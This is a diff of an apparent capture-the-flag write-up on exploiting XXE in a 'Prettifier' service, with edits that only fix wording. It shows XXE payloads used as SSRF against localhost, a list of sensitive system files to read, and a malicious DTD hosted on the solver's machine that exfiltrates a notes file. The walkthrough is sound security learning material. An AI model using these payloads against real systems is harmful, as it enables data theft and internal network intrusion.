@@ -41,7 +41,7 @@ games:x:5:60:games:/usr/games:/usr/sbin/nologin
 ...
 ```
 
-So far so good. Let's try SSRF to read `/notes` and bypass IP filter:
+So far so good. Let's try SSRF to read `/notes` and bypass the IP filter:
 
 ```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:50000/notes"> ]>
@@ -54,7 +54,7 @@ http://localhost:50000/notes:45:8:FATAL:PARSER:ERR_TAG_NOT_FINISHED: Premature e
 <string>:2:9:FATAL:PARSER:ERR_UNDECLARED_ENTITY: Entity 'xxe' failed to parse
 ```
 
-This kinda works. Unfortunately notes content is **not a valid XM**L, so it can't be included into our XML.
+This kinda works. Unfortunately, notes content is **not a valid XML**, so it can't be included into our XML.
 
 I read a few articles about XXE, looking for some way how to get around this.
 
@@ -76,7 +76,7 @@ List of possibly interesting files to read:
 - `/etc/hosts`
 - `/etc/init.d/apache2` (not valid XML)
 - `proc/self/cwd` - points to current workdir of the running process
-- `proc/self/maps` - memory layout, loaded libraries, see [](maps.txt)
+- `proc/self/maps` - memory layout, loaded libraries, see [maps.txt](maps.txt)
 - `proc/net/route`
 - `/opt/prettier/.gitignore`
 
@@ -85,10 +85,10 @@ as I was unable to read any source code or the notes file directly from the disk
 
 ## Solution: The VPN 🤦‍♂️
 
-After all I asked for a hint, and I was told to **use my computer to host the malicious DTD**!
+After all I asked a friend for a hint, and I was told to **use my computer to host the malicious DTD**!
 My machine is in VPN so the Prettifier server can access it. Of course!
 
-Then it was easy. I used Python `http.server` module to host my malicious DTD:
+Then it was easy. I used Python [http.server](https://docs.python.org/3/library/http.server.html) module to host my malicious DTD:
 
 ```
 <!ENTITY % file SYSTEM "http://localhost:50000/notes">
@@ -97,9 +97,9 @@ Then it was easy. I used Python `http.server` module to host my malicious DTD:
 %exfiltrate;
 ```
 
-Don't forget to disable/configure the firewall.
+Don't forget to disable/configure your firewall.
 
-Finally, send the request:
+Finally, send the request to Prettifier:
 
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.200.0.26:8000/malicous.dtd"> %xxe;]>
